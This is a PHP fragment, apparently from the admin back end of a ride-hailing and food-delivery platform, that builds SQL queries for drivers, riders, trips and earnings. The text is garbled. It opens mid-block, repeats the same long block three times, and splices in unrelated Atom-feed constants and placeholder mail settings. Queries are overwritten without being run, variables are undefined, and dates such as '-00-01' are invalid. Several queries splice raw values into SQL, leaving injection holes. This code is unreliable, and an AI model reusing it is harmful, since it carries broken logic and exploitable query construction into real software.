	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT rd.*, c.vCompany companyFirstName, c.vLastName companyLastName FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId WHERE  rd.eStatus != \'Deleted\'' . $ssl . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT count(rd.iDriverId) as tot_driver FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId and c.eStatus != \'Deleted\' WHERE  rd.eStatus != \'Deleted\'';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$sql = 'SELECT dv.*, m.vMake, md.vTitle,rd.vEmail, rd.vName, rd.vLastName, c.vName as companyFirstName, c.vLastName as companyLastName' . "\r\n" . 'FROM driver_vehicle dv, register_driver rd, make m, model md, company c' . "\r\n" . 'WHERE' . "\r\n" . 'dv.iMakeId = m.iMakeId' . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	if ($status == 'all') {
		$sql = 'SELECT * FROM register_user WHERE 1 = 1 ';
	}
	else {
		$sql = 'SELECT * FROM register_user WHERE eStatus != \'Deleted\'';
	}

	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssql1 = 'AND (vEmail != \'\' OR vPhone != \'\')';

	if ($status == 'all') {
		$sql = 'SELECT count(iUserId) as tot_rider FROM register_user WHERE 1 = 1 ' . $ssql1 . $cmp_ssql;
	}
	else {
		$sql = 'SELECT count(iUserId) FROM register_user WHERE eStatus != \'Deleted\'' . $ssql1 . $cmp_ssql;
	}

	if (0 < count($data)) {
		$common_member = 'SELECT iDriverId' . "\r\n" . 'FROM register_driver' . "\r\n" . 'WHERE tRegistrationDate < \'' . $er_date . '\'';
		$sql = 'DELETE FROM driver_vehicle WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM trips WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM log_file WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM register_driver WHERE tRegistrationDate < \'' . $date . '\'';
	}

	if (0 < count($userObj->locations)) {
		$locations = implode(', ', $userObj->locations);
		$locations_where = ' AND EXISTS(SELECT * FROM vehicle_type WHERE trips.iVehicleTypeId = vehicle_type.iVehicleTypeId AND vehicle_type.iLocationid IN(-1, ' . $locations . '))';
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT COUNT(iTripId) as tot FROM trips WHERE 1 = 1 AND eSystem = \'General\'' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT iTripId FROM trips WHERE 1' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-01';
		$endDate = date('Y-m') . '-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-01';
		$endDate1 = date('Y') . '-12-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . '';
		$endDate2 = date('Y-m-d') . '';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	$mailerCharSet = 'UTF-8';
	$mailerHost = 'mail.example.com';
	$mailerSMTPDebug = 0;
	$mailerSMTPAuth = true;
	$mailerPort = 25;
	$mailerUsername = 'username';
	$mailerPassword = 'password';
	$message = 'The mail message was sent with the following mail setting:' . "\r\n" . 'SMTP = aspmx.l.google.com' . "\r\n" . 'smtp_port = 25' . "\r\n" . 'sendmail_from = YourMail@address.com';
	$headers = 'From: YOURMAIL@gmail.com';
	echo 'Check your email now....<BR/>';
	$NS = 'http://www.w3.org/2005/Atom';
	$ATOM_CONTENT_ELEMENTS = ['content', 'summary', 'title', 'subtitle', 'rights'];
	$ATOM_SIMPLE_ELEMENTS = ['id', 'updated', 'published', 'draft'];
	$debug = false;
	$depth = 0;
	$indent = 2;
	$ns_contexts = [];
	$ns_decls = [];
	$content_ns_decls = [];
	$content_ns_contexts = [];
	$is_xhtml = false;
	$is_html = false;
	$is_text = true;
	$skipped_div = false;
	$FILE = 'php://input';

	foreach ($data as $key => $value) {
		$fCommision = $value['fCommision'];
		$fTotalGenerateFare = $value['fTotalGenerateFare'];
		$fDeliveryCharge = $value['fDeliveryCharge'];
		$fOffersDiscount = $value['fOffersDiscount'];
		$fRestaurantPayAmount = $value['fRestaurantPayAmount'];
		if (($value['iStatusCode'] == '7') || ($value['iStatusCode'] == '8')) {
			$amounts = $fRestaurantPaidAmount;
		}
		else {
			$amounts = $fTotalGenerate - $fComm - $fDelivery - $fOffersDis;
		}

		$total += $amounts;
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}
}

if (!isset($_SESSION['sess_lang'])) {
	$sql = 'select vTitle, vCode, vCurrencyCode, eDefault,eDirectionCode from language_master where eDefault=\'Yes\' limit 0,1';
	$db_lng_mst = $obj->MySQLSelect($sql);
	$_SESSION['sess_lang'] = $db_lng_mst[0]['vCode'];
	$_SESSION['eDirectionCode'] = $db_lng_mst[0]['eDirectionCode'];
}

if ($iCustomerId == '1') {
	$cmp_ssql = '';
	$eSystem = ' AND eSystem = \'General\'';
	$sql = 'SELECT * FROM company WHERE eStatus != \'Deleted\'  ' . $cmp_ssql . ' order by tRegistrationDate desc';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT rd.*, c.vCompany companyFirstName, c.vLastName companyLastName FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId WHERE  rd.eStatus != \'Deleted\'' . $ssl . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT count(rd.iDriverId) as tot_driver FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId and c.eStatus != \'Deleted\' WHERE  rd.eStatus != \'Deleted\'';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$sql = 'SELECT dv.*, m.vMake, md.vTitle,rd.vEmail, rd.vName, rd.vLastName, c.vName as companyFirstName, c.vLastName as companyLastName' . "\r\n" . 'FROM driver_vehicle dv, register_driver rd, make m, model md, company c' . "\r\n" . 'WHERE' . "\r\n" . 'dv.iMakeId = m.iMakeId' . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	if ($status == 'all') {
		$sql = 'SELECT * FROM register_user WHERE 1 = 1 ';
	}
	else {
		$sql = 'SELECT * FROM register_user WHERE eStatus != \'Deleted\'';
	}

	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssql1 = 'AND (vEmail != \'\' OR vPhone != \'\')';

	if ($status == 'all') {
		$sql = 'SELECT count(iUserId) as tot_rider FROM register_user WHERE 1 = 1 ' . $ssql1 . $cmp_ssql;
	}
	else {
		$sql = 'SELECT count(iUserId) FROM register_user WHERE eStatus != \'Deleted\'' . $ssql1 . $cmp_ssql;
	}

	if (0 < count($data)) {
		$common_member = 'SELECT iDriverId' . "\r\n" . 'FROM register_driver' . "\r\n" . 'WHERE tRegistrationDate < \'' . $er_date . '\'';
		$sql = 'DELETE FROM driver_vehicle WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM trips WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM log_file WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM register_driver WHERE tRegistrationDate < \'' . $date . '\'';
	}

	if (0 < count($userObj->locations)) {
		$locations = implode(', ', $userObj->locations);
		$locations_where = ' AND EXISTS(SELECT * FROM vehicle_type WHERE trips.iVehicleTypeId = vehicle_type.iVehicleTypeId AND vehicle_type.iLocationid IN(-1, ' . $locations . '))';
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT COUNT(iTripId) as tot FROM trips WHERE 1 = 1 AND eSystem = \'General\'' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT iTripId FROM trips WHERE 1' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-01';
		$endDate = date('Y-m') . '-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-01';
		$endDate1 = date('Y') . '-12-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . '';
		$endDate2 = date('Y-m-d') . '';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	$mailerCharSet = 'UTF-8';
	$mailerHost = 'mail.example.com';
	$mailerSMTPDebug = 0;
	$mailerSMTPAuth = true;
	$mailerPort = 25;
	$mailerUsername = 'username';
	$mailerPassword = 'password';
	$message = 'The mail message was sent with the following mail setting:' . "\r\n" . 'SMTP = aspmx.l.google.com' . "\r\n" . 'smtp_port = 25' . "\r\n" . 'sendmail_from = YourMail@address.com';
	$headers = 'From: YOURMAIL@gmail.com';
	echo 'Check your email now....<BR/>';
	$NS = 'http://www.w3.org/2005/Atom';
	$ATOM_CONTENT_ELEMENTS = ['content', 'summary', 'title', 'subtitle', 'rights'];
	$ATOM_SIMPLE_ELEMENTS = ['id', 'updated', 'published', 'draft'];
	$debug = false;
	$depth = 0;
	$indent = 2;
	$ns_contexts = [];
	$ns_decls = [];
	$content_ns_decls = [];
	$content_ns_contexts = [];
	$is_xhtml = false;
	$is_html = false;
	$is_text = true;
	$skipped_div = false;
	$FILE = 'php://input';

	foreach ($data as $key => $value) {
		$fCommision = $value['fCommision'];
		$fTotalGenerateFare = $value['fTotalGenerateFare'];
		$fDeliveryCharge = $value['fDeliveryCharge'];
		$fOffersDiscount = $value['fOffersDiscount'];
		$fRestaurantPayAmount = $value['fRestaurantPayAmount'];
		if (($value['iStatusCode'] == '7') || ($value['iStatusCode'] == '8')) {
			$amounts = $fRestaurantPaidAmount;
		}
		else {
			$amounts = $fTotalGenerate - $fComm - $fDelivery - $fOffersDis;
		}

		$total += $amounts;
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}
}

if ($iCustomerId == '1') {
	$cmp_ssql = '';
	$eSystem = ' AND eSystem = \'General\'';
	$sql = 'SELECT * FROM company WHERE eStatus != \'Deleted\'  ' . $cmp_ssql . ' order by tRegistrationDate desc';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT rd.*, c.vCompany companyFirstName, c.vLastName companyLastName FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId WHERE  rd.eStatus != \'Deleted\'' . $ssl . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT count(rd.iDriverId) as tot_driver FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId and c.eStatus != \'Deleted\' WHERE  rd.eStatus != \'Deleted\'';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$sql = 'SELECT dv.*, m.vMake, md.vTitle,rd.vEmail, rd.vName, rd.vLastName, c.vName as companyFirstName, c.vLastName as companyLastName' . "\r\n" . 'FROM driver_vehicle dv, register_driver rd, make m, model md, company c' . "\r\n" . 'WHERE' . "\r\n" . 'dv.iMakeId = m.iMakeId' . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	if ($status == 'all') {
		$sql = 'SELECT * FROM register_user WHERE 1 = 1 ';
	}
	else {
		$sql = 'SELECT * FROM register_user WHERE eStatus != \'Deleted\'';
	}

	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssql1 = 'AND (vEmail != \'\' OR vPhone != \'\')';

	if ($status == 'all') {
		$sql = 'SELECT count(iUserId) as tot_rider FROM register_user WHERE 1 = 1 ' . $ssql1 . $cmp_ssql;
	}
	else {
		$sql = 'SELECT count(iUserId) FROM register_user WHERE eStatus != \'Deleted\'' . $ssql1 . $cmp_ssql;
	}

	if (0 < count($data)) {
		$common_member = 'SELECT iDriverId' . "\r\n" . 'FROM register_driver' . "\r\n" . 'WHERE tRegistrationDate < \'' . $er_date . '\'';
		$sql = 'DELETE FROM driver_vehicle WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM trips WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM log_file WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM register_driver WHERE tRegistrationDate < \'' . $date . '\'';
	}

	if (0 < count($userObj->locations)) {
		$locations = implode(', ', $userObj->locations);
		$locations_where = ' AND EXISTS(SELECT * FROM vehicle_type WHERE trips.iVehicleTypeId = vehicle_type.iVehicleTypeId AND vehicle_type.iLocationid IN(-1, ' . $locations . '))';
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT COUNT(iTripId) as tot FROM trips WHERE 1 = 1 AND eSystem = \'General\'' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT iTripId FROM trips WHERE 1' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-01';
		$endDate = date('Y-m') . '-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-01';
		$endDate1 = date('Y') . '-12-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . '';
		$endDate2 = date('Y-m-d') . '';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	$mailerCharSet = 'UTF-8';
	$mailerHost = 'mail.example.com';
	$mailerSMTPDebug = 0;
	$mailerSMTPAuth = true;
	$mailerPort = 25;
	$mailerUsername = 'username';
	$mailerPassword = 'password';
	$message = 'The mail message was sent with the following mail setting:' . "\r\n" . 'SMTP = aspmx.l.google.com' . "\r\n" . 'smtp_port = 25' . "\r\n" . 'sendmail_from = YourMail@address.com';
	$headers = 'From: YOURMAIL@gmail.com';
	echo 'Check your email now....<BR/>';
	$NS = 'http://www.w3.org/2005/Atom';
	$ATOM_CONTENT_ELEMENTS = ['content', 'summary', 'title', 'subtitle', 'rights'];
	$ATOM_SIMPLE_ELEMENTS = ['id', 'updated', 'published', 'draft'];
	$debug = false;
	$depth = 0;
	$indent = 2;
	$ns_contexts = [];
	$ns_decls = [];
	$content_ns_decls = [];
	$content_ns_contexts = [];
	$is_xhtml = false;
	$is_html = false;
	$is_text = true;
	$skipped_div = false;
	$FILE = 'php://input';

	foreach ($data as $key => $value) {
		$fCommision = $value['fCommision'];
		$fTotalGenerateFare = $value['fTotalGenerateFare'];
		$fDeliveryCharge = $value['fDeliveryCharge'];
		$fOffersDiscount = $value['fOffersDiscount'];
		$fRestaurantPayAmount = $value['fRestaurantPayAmount'];
		if (($value['iStatusCode'] == '7') || ($value['iStatusCode'] == '8')) {
			$amounts = $fRestaurantPaidAmount;
		}
		else {
			$amounts = $fTotalGenerate - $fComm - $fDelivery - $fOffersDis;
		}

		$total += $amounts;
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}
}

include_once 'common_inc.php';

?>